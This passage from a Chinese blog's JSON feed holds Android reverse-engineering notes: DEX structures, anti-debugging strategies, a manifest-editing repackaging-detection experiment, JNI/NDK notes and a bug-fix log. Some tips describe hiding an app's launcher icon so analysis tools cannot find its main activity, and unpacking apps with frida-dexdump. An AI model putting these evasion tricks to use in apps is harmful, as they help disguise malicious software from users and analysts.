结构的索引。</p>\n<h1 id=\"proto_ids\"><a class=\"anchor\" href=\"#proto_ids\">#</a> proto_ids</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#     struct proto_ids&#123;</span><br><span class=\"line\">#              shortyIdx;   // 指向 string_Ids 列表的索引 </span><br><span class=\"line\">#              returnTypeIdx;  // 指向 type_Id 列表的索引 </span><br><span class=\"line\">#              parametersOff;  // 指向 type_list 的位置偏移 </span><br><span class=\"line\">#              &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"type_list\"><a class=\"anchor\" href=\"#type_list\">#</a> type_list</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#     struct type_list&#123;</span><br><span class=\"line\">#             size; //type_Item 的个数 </span><br><span class=\"line\">#             type_item  list [1];  //type_Item 结构，只有一个 type_id 参数，指向 type_id 列表 </span><br><span class=\"line\">#             &#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"field_ids\"><a class=\"anchor\" href=\"#field_ids\">#</a> field_ids</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#        struct field_ids&#123;</span><br><span class=\"line\">#             classIdx;  // 类的类型，指向 type_Id 列表的索引 </span><br><span class=\"line\">#             typeIdx;  // 字段类型，指向 type_Id 列表的索引 </span><br><span class=\"line\">#             nameIdx;  // 字段名，指向 string_Id 列表的索引 </span><br><span class=\"line\">#             &#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"methods_ids\"><a class=\"anchor\" href=\"#methods_ids\">#</a> methods_ids</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#      struct method_id&#123;</span><br><span class=\"line\">#             classIdx;   // 类的类型，指向 type_Id 列表的索引 </span><br><span class=\"line\">#             protoIdx;  // 声明类型，指向 proto_Id 列表的索引 </span><br><span class=\"line\">#             nameIdx;  // 方法名，指向 string_Id 列表的索引 </span><br><span class=\"line\">#             &#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"class_defs\"><a class=\"anchor\" href=\"#class_defs\">#</a> class_defs</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#           struct    class_defs&#123;</span><br><span class=\"line\">#                   classIdx;  // 类的类型，指向 type_Id 列表的索引 </span><br><span class=\"line\">#                   accessFlags;  // 访问标志 </span><br><span class=\"line\">#                   superclassIdx;  // 父类类型，指向 type_Id 列表的索引 </span><br><span class=\"line\">#                   interfacesOff;  // 接口，指向 type_list 的偏移 </span><br><span class=\"line\">#                   sourceFileIdx;  // 源文件名，指向 string_Ids 列表的索引 </span><br><span class=\"line\">#                   annotationsOff;  // 注解，指向 annotationsDirectory_Item 结构 </span><br><span class=\"line\">#                   classDataOff;  // 指向 class_data 结构的偏移 </span><br><span class=\"line\">#                   staticValuesOff;  // 指向 encoded_array 结构的偏移 </span><br><span class=\"line\">#                   &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"class_data\"><a class=\"anchor\" href=\"#class_data\">#</a> class_data</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#        struct DexClassData&#123;</span><br><span class=\"line\">#              classDataHeader\theader;\t     // 指定字段与方法的个数 </span><br><span class=\"line\">#              Field* \t\tstaticFields;   // 静态字段，Field 结构 </span><br><span class=\"line\">#              Field*\t\tinstanceFields;  // 实例字段，Field 结构 </span><br><span class=\"line\">#              Method*\t\tdirectMethods;  // 直接方法，Method 结构 </span><br><span class=\"line\">#              Method*\t\tvirtualMethods;  // 虚方法，Method 结构 </span><br><span class=\"line\">#              &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"classdataheader\"><a class=\"anchor\" href=\"#classdataheader\">#</a> classDataHeader</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#   struct classDataHeader&#123;</span><br><span class=\"line\">#               staticFieldsSize;  // 静态字段个数 </span><br><span class=\"line\">#               instanceFieldsSize;  // 实例字段个数 </span><br><span class=\"line\">#               directMethodsSize;  // 直接方法个数 </span><br><span class=\"line\">#               virtualMethodsSize;  // 虚方法个数 </span><br><span class=\"line\">#               &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"field\"><a class=\"anchor\" href=\"#field\">#</a> Field</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#       struct DexField&#123;</span><br><span class=\"line\">#            field_Idx;  // 指向 field_Ids 的索引 </span><br><span class=\"line\">#            accessFlags;  // 访问标志 </span><br><span class=\"line\">#            &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"method\"><a class=\"anchor\" href=\"#method\">#</a> Method</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#           struct DexMethod&#123;</span><br><span class=\"line\">#                   method_Idx;  // 指向 method_Ids 的索引 </span><br><span class=\"line\">#                   accessFlags;  // 访问标志 </span><br><span class=\"line\">#                   codeOff;  // 指向 code 结构的偏移 </span><br><span class=\"line\">#                   &#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Android",
                "Knowledge"
            ]
        },
        {
            "id": "http://ericcd.com/2022/03/04/Android-reverce-2022.3.4-1/",
            "url": "http://ericcd.com/2022/03/04/Android-reverce-2022.3.4-1/",
            "title": "Android 逆向 - 2022.3.4-1",
            "date_published": "2022-03-04T01:34:29.000Z",
            "content_html": "<p>记录一些常见的反调试策略。<br />\n<span id=\"more\"></span><br />\n1.java 代码混淆。<br />\n2. 资源文件混淆：可以使用 MT 管理器来单独修改 apk 中的 dex 文件。<br />\n3. 签名验证。<br />\n4. 模拟器检测。<br />\n5. 关键文件检测。<br />\n6. 调试端口检测。<br />\n7. 进程名称检测。</p>\n",
            "tags": [
                "Android逆向知识",
                "Android逆向"
            ]
        },
        {
            "id": "http://ericcd.com/2022/03/01/Androidmanifest-modify-2022.3.1-1/",
            "url": "http://ericcd.com/2022/03/01/Androidmanifest-modify-2022.3.1-1/",
            "title": "Androidmanifest 修改实践",
            "date_published": "2022-03-01T13:09:53.000Z",
            "content_html": "<p>在网上看见通过修改 Androidmanifest 来识别 apk 是否被重打包的方法，进行一次实践进行验证。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"工具准备\"><a class=\"anchor\" href=\"#工具准备\">#</a> 工具准备</h1>\n<p>本次实践使用 Android Studio 编写实验代码，通过 010Editor 对 Androidmanifest 文件进行修改，使用 jarsign 对修改后的 apk 进行签名。另外，还会使用到 apktool 来对修改后的 apk 进行重打包，进而判断 apktool 是否会对 apk 造成影响。本次实践还使用到了 ddms 来查看日志输出，判断关键代码是否被触发。</p>\n<h1 id=\"实践过程\"><a class=\"anchor\" href=\"#实践过程\">#</a> 实践过程</h1>\n<p>通过 Android Studio 编写 apk，为了实施方便，代码中仅包含.MainActivity 与.appApplication。其中，.appApplication 作为 application 中的 andtoid:name 标签值，其功能为输出一段日志信息。<br />\n进行第一次测试，ddms 能够准确捕获到该日志信息，确定函数顺利执行。<br />\n使用 Bandizip 提取 apk 中的 Androidmanifest.xml 文件（尝试过使用 winrar，但是该工具会破坏 apk 结构，造成无法进一步实验），使用 010Editor 对 Androidmanifest 进行修改，主要是对 stringChunk 与 resourceChunk 修改，将两段中存储的变量个数对齐，并将 string 值设置为 name，resourceID 设置为 0 (因为在 Android 标签的结构体中，使用同一索引值来寻找字符串与资源 ID。并且，不要动本来就有的 name 标签与 ID，后面的其它资源可能会用到，改了会报错)。此外，还要对 filesize 等部分进行相应的修改，此处不一一讨论。<br />\n将修改后的 Androidmanifest 放回 apk 中，删去 META-INF 文件，使用之前的签名文件 (keys.jks) 来对 apk 重新签名，签名使用到了 jarsign 工具，命令如下所示：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ jarsigner -keystore keys.jks -signedjar appsigned.apk appunsigned.apk key0 </span><br></pre></td></tr></table></figure></p>\n<p>之后将重新签名完成的 apk 放入模拟器运行，ddms 没有接收到任何日志信息，可以发现.appApplication 未被执行。<br />\n使用 apktool 对 apk 进行重打包，再将生成的 apk 放入模拟器运行，ddms 再次接收到日志信息。</p>\n<h1 id=\"结论\"><a class=\"anchor\" href=\"#结论\">#</a> 结论</h1>\n<p>Android 在运行时使用 ID 来寻找资源，当资源 ID 违法时 (本次实践中值为 0)，Android 会忽略该 ID 对应的资源 (本次实践中的.appApplication)。但是一旦使用 apktool 对 apk 进行重打包，apktool 会对 Androidmanifest 进行修复，将非法 ID 改为正常 ID，使得.appApplication 能够重新运行。</p>\n",
            "tags": [
                "Android逆向实践",
                "ddms",
                "Android逆向",
                "apktool",
                "jarsign",
                "010Editor",
                "Android Studio"
            ]
        },
        {
            "id": "http://ericcd.com/2022/02/28/bugs/",
            "url": "http://ericcd.com/2022/02/28/bugs/",
            "title": "日常遇到的 BUG 及其修复方式",
            "date_published": "2022-02-28T15:15:24.000Z",
            "content_html": "<p>记录遇到过的 bug。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"打开-monitorbat-时报错an-error-occured\"><a class=\"anchor\" href=\"#打开-monitorbat-时报错an-error-occured\">#</a> 打开 monitor.bat 时报错：An error occured。</h1>\n<p>jdk 版本太高了，改成了 1.8 版本顺利运行。</p>\n<h1 id=\"夜神模拟器无法自动连接-android-studio\"><a class=\"anchor\" href=\"#夜神模拟器无法自动连接-android-studio\">#</a> 夜神模拟器无法自动连接 Android Studio。</h1>\n<p>切换到夜神模拟器安装目录下的 bin 文件夹，执行以下指令：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"使用-android-killer-重打包失败\"><a class=\"anchor\" href=\"#使用-android-killer-重打包失败\">#</a> 使用 Android Killer 重打包失败</h1>\n<p>更换成最新的 apktool。</p>\n<h1 id=\"找不到-ddms\"><a class=\"anchor\" href=\"#找不到-ddms\">#</a> 找不到 ddms</h1>\n<p>ddms 已经更名成 monitor，并且使用前最好将 java 版本降为 javaSE1.8，否则可能报错。</p>\n<h1 id=\"使用-ddms-查看不了夜神模拟器的日志输出\"><a class=\"anchor\" href=\"#使用-ddms-查看不了夜神模拟器的日志输出\">#</a> 使用 ddms 查看不了夜神模拟器的日志输出</h1>\n<p>换成雷神模拟器。</p>\n<h1 id=\"使用-android-studio-时代码补全功能消失\"><a class=\"anchor\" href=\"#使用-android-studio-时代码补全功能消失\">#</a> 使用 Android Studio 时代码补全功能消失</h1>\n<ol>\n<li>关闭省电模式。</li>\n<li>重新进行以便 Grald Sync</li>\n</ol>\n<h1 id=\"在-android-studio-中加载动态库时提示找不到动态库\"><a class=\"anchor\" href=\"#在-android-studio-中加载动态库时提示找不到动态库\">#</a> 在 Android studio 中加载动态库时提示找不到动态库</h1>\n<p>在 build.gralde 中的 android {} 里添加以下代码。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$      sourceSets &#123;</span><br><span class=\"line\">$                             main&#123;</span><br><span class=\"line\">$                                         jniLibs.srcDirs=[&#x27;src/main/libs&#x27;]</span><br><span class=\"line\">$                                      &#125;</span><br><span class=\"line\">$                           &#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"提示在动态库中找不到函数\"><a class=\"anchor\" href=\"#提示在动态库中找不到函数\">#</a> 提示在动态库中找不到函数</h1>\n<p>确定动态库已经加载，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1qdnZ4cy5zbw==\">检查.so</span> 文件，发现其中没有我自己编写的代码。查看 ndk-build 的 log，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1waHFzM2xrNGpxMmRodmE1MDJiczdiZDRvOXdmYjRkZTY5ZG53eWIuc28=\">发现虽然没报错且正常生成.so</span> 文件，但是没有编译.c 文件的步骤。检查 <span class=\"exturl\" data-url=\"aHR0cDovL0FuZHJvaWQubWs=\">Android.mk</span> 文件，发现 LOCAL_SRC_FILES 标签少写了最后的 S，导致 ndk-build 没有编译指定文件。</p>\n<h1 id=\"使用-ndk-build-编译时提示-jniexport-后面缺少符号\"><a class=\"anchor\" href=\"#使用-ndk-build-编译时提示-jniexport-后面缺少符号\">#</a> 使用 ndk-build 编译时提示 JNIEXPORT 后面缺少；符号</h1>\n<p>自动生成的.h 文件中，函数定义末尾少了；符号，加上就不报错了。</p>\n<h1 id=\"使用-frida-dexdump-脱壳时报错script-has-been-destroyed\"><a class=\"anchor\" href=\"#使用-frida-dexdump-脱壳时报错script-has-been-destroyed\">#</a> 使用 Frida-dexdump 脱壳时报错：script has been destroyed</h1>\n<p>可能是框架问题，但在本次实践中是由于 app 不稳定崩溃导致的。</p>\n<h1 id=\"使用-class-结构时发现该结构实际长度比其中的数据长度长\"><a class=\"anchor\" href=\"#使用-class-结构时发现该结构实际长度比其中的数据长度长\">#</a> 使用 class 结构时，发现该结构实际长度比其中的数据长度长</h1>\n<p>因为编译器按照 4 字节对 class 进行对齐，不足的补 0，可以在代码开头加上以下声明来取消对齐。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  pragma pack (1)  // 按照 1 字节对齐，等于没对齐。</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"使用-malloc-分配空间后向其中写入-char但是发现-cout-时后续跟了许多脏字符\"><a class=\"anchor\" href=\"#使用-malloc-分配空间后向其中写入-char但是发现-cout-时后续跟了许多脏字符\">#</a> 使用 malloc 分配空间后，向其中写入 char，但是发现 cout 时后续跟了许多脏字符</h1>\n<p>如果 malloc 申请的空间长度等于需要写入的字符长度，那么 cout 时在字符末尾找不到终止符，会继续读，直到遇见终止符为止。建议使用 calloc 来分配空间，该函数能将分配的空间初始化为 0，并且申请的空间长度应该为字符长度 + 1。</p>\n",
            "tags": [
                "BUG修复",
                "bugs"
            ]
        },
        {
            "id": "http://ericcd.com/2022/02/28/Android-reverce-2022-28-1/",
            "url": "http://ericcd.com/2022/02/28/Android-reverce-2022-28-1/",
            "title": "Android 逆向 - 2022.28-1",
            "date_published": "2022-02-28T01:34:57.000Z",
            "content_html": "<p>记录一些 jni 中的函数使用与静态注册相关知识。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"可执行程序编译\"><a class=\"anchor\" href=\"#可执行程序编译\">#</a> 可执行程序编译</h1>\n<p>首先准备 <span class=\"exturl\" data-url=\"aHR0cDovL0FuZHJvaWQubWs=\">Android.mk</span> 文件，文件内容如下所示：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ LOCAL_PATH := $(call my-dir)</span><br><span class=\"line\">$ include $(CLEAR_VARS)</span><br><span class=\"line\">$ LOCAL_ARM_MODE := arm #确定编译后的指令集 </span><br><span class=\"line\">$ LOCAL_MODULE := example #模块名称 </span><br><span class=\"line\">$ LOCAL_SRC_FILES := JNI_example.c #c 源文件 </span><br><span class=\"line\">$ LOCAL_LDLIBS += -llog #依赖库 </span><br><span class=\"line\">$ include $(BUILD EXECUTABLE) #将.c 构建为可执行程序，使用 shared_library 则会生成动态链接库， 使用 static_library 会生成静态链接库 </span><br></pre></td></tr></table></figure><br />\n 准备 <span class=\"exturl\" data-url=\"aHR0cDovL0FwcGxpY2F0aW9uLm1r\">Application.mk</span> 文件，文件内代码如下所示：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$  APP_API := x86 armeabi-v7a</span><br></pre></td></tr></table></figure><br />\n 在以上文件存储处打开 cmd，执行 ndk-build 指令生成 linux 下的可执行程序。</p>\n<h1 id=\"相关函数\"><a class=\"anchor\" href=\"#相关函数\">#</a> 相关函数</h1>\n<p>jni 中的函数可以在 /java/include 下的 jni.h 文件中查询，以下只列举了一些可能使用到的函数。</p>\n<h2 id=\"调用-java-层普通方法\"><a class=\"anchor\" href=\"#调用-java-层普通方法\">#</a> 调用 java 层普通方法</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ （*CallObjectMethod) (JNIEnv*, jobject, jmethodID, ...);</span><br></pre></td></tr></table></figure><br />\n 前两个为默认参数，第三个参数由以下方法获取。</p>\n<h2 id=\"获取-java-层实例方法的值\"><a class=\"anchor\" href=\"#获取-java-层实例方法的值\">#</a> 获取 java 层实例方法的值</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$  jmethodID (*GetMethodID) (JNIEnv*, jclass, const char*, const char*);</span><br></pre></td></tr></table></figure><br />\n 其中，第一个 const char * 为 java 层方法名称，第二个 const char * 为 java 层方法的签名 (即方法返回类型)，而 jclass 由以下方法获取：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ jclass (*FindClass) (JNIEnv*, const char*)</span><br></pre></td></tr></table></figure><br />\n 其中，const char * 为目标所在 class 的路径 (使用 \\ 代替.)。</p>\n<h2 id=\"获取-java-层实例字段的值\"><a class=\"anchor\" href=\"#获取-java-层实例字段的值\">#</a> 获取 java 层实例字段的值</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ jobject (*GetObjectField) (JNIEnv*, jobject , jfieldID);</span><br></pre></td></tr></table></figure><br />\n 其中，jfieldID 由以下代码获取：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ jfieldID (*GetFieldID) (JNIenv*, jclass, const char*, const char*);</span><br></pre></td></tr></table></figure><br />\n 第一个 const char * 为实例字段的名称，第二个 const char * 为实例字段签名 (即实例字段类型)。</p>\n<h2 id=\"设置-java-层实例字段的值\"><a class=\"anchor\" href=\"#设置-java-层实例字段的值\">#</a> 设置 java 层实例字段的值</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ void (*SetObjectField) (JNIEnv*, jobject, jfieldID, jobject);</span><br></pre></td></tr></table></figure><br />\n 第二个 jobject 为 java 层实例字段设置的值。</p>\n<h1 id=\"静态注册\"><a class=\"anchor\" href=\"#静态注册\">#</a> 静态注册</h1>\n<h2 id=\"生成-jni-头文件\"><a class=\"anchor\" href=\"#生成-jni-头文件\">#</a> 生成 jni 头文件</h2>\n<p>在 class 代码中声明 native 方法，之后在 cmd 窗口中切换到源码目录处，执行以下代码生成 jni 头文件：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ javah -jni com.example.main.class</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"编写-c-代码\"><a class=\"anchor\" href=\"#编写-c-代码\">#</a> 编写 c 代码</h2>\n<p>在 c 文件中 include 之前生成的头文件，之后便能在 c 文件中具体实现在头文件中声明的函数。</p>\n<h2 id=\"生成动态链接库\"><a class=\"anchor\" href=\"#生成动态链接库\">#</a> 生成动态链接库</h2>\n<p>将之前的两个 mk 文件同.c 与.h 文件放在同一文件夹下，使用 ndk-build 生成动态链接库文件。</p>\n<h2 id=\"调用动态链接库\"><a class=\"anchor\" href=\"#调用动态链接库\">#</a> 调用动态链接库</h2>\n<p>在 java 代码中使用以下代码调用生成的动态链接库：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ System.loadLibrary (&quot;Module&quot;)</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>将以上个部分内容相结合，即可实现在 native 层调用 java 函数或获取 java 变量值。</p>\n",
            "tags": [
                "Android逆向知识",
                "jni",
                "ndk",
                "静态注册"
            ]
        },
        {
            "id": "http://ericcd.com/2022/02/27/Android-Knowledge/",
            "url": "http://ericcd.com/2022/02/27/Android-Knowledge/",
            "title": "Android 知识",
            "date_published": "2022-02-27T08:26:04.000Z",
            "content_html": "<p>记录一些学习到的 Android 相关知识。<br />\n<span id=\"more\"></span><br />\n1.application 中的 android:name 属性用来指定 app 启动时关联的 application，默认关联的为 android.app.Application。也可以将其设置为一个我们自己编辑的 class，该 class 将被 application 下的所有 activity 共享。<br />\n2.android.intent.action.MAIN 用于决定程序最先启动的 Activity，android.intent.category.LAUNCHER 用于决定程序是否显示在程序列表（桌面）里。没有 android.intent.action.MAIN，能够安装程序，但桌面不会显示启动器，程序也无法运行。<br />\n没有 android.intent.category.LAUNCHER，程序可以正常运行，但是桌面不会显示启动器。一个 apk 中有多个 activity 中存在 android.intent.action.MAIN 和 android.intent.category.LAUNCHER，桌面上会显示复数个应用图标，但是对应的为同一应用文件。<br />\n3. 在 Android 中使用 android.os.build 来获取设备相关信息，而 android.os.build 通过 SystemProperties.getString 来获取静态字段值，Systemproperties 是 android.os 中标记为 hide 的类，无法直接访问，但是可以通过反射的方式获取。该类使用 native 方法 native_get 来后去系统属性值，该方法的源代码在 android_os_SystemProperties.cpp 文件中。<br />\n4. 将 android.intent.category.LAUNCHER 更改为 -.INFO 或 -.FRAMEWORK_INSTRUMENTATION_TEST, 能够实现在桌面上隐藏程序同时不影响程序正常运行。并且因为没有了 android.inntent.category.LAUNCHER 作为特征，一些 apk 分析工具就无法定位 MainActivity。<br />\n5. 可以将 Androidmanifest 中的一些非必要标签的资源 ID 改为 0，从而屏蔽实现该标签的作用。</p>\n",
            "tags": [
                "Android",
                "Knowledge"
            ]
        }
    ]
}